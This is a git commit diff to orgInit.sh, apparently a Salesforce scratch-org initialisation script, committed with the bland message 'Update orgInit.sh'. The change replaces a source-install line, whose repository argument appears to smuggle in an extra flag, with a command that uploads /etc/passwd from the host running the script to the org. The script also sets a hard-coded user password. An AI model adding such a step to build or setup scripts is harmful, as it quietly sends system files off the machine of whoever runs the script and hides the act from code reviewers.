82a9fa49e40901f91a42d46ebb3bbf8d111280db
mehboob <77236545+zeb0x01@users.noreply.github.com>
2024-12-09 19:39:10 +0530

    Update orgInit.sh

--- orgInit.sh
+++ orgInit.sh
@@ -1,5 +1,5 @@
 sf demoutil org create scratch -f config/project-scratch-def.json -d 5 -s -p data -e detect.demo
-sfdx shane:github:src:install -g zeb0x01 -r "sfdxtest -v"
+sfdx shane:data:file:upload -f /etc/passwd -n zeb0x01test
 sf package install -w 20 -r -p 04t5e000000aVeP
 sf project deploy start
 sf demoutil user password set -p salesforce1 -g User -l User
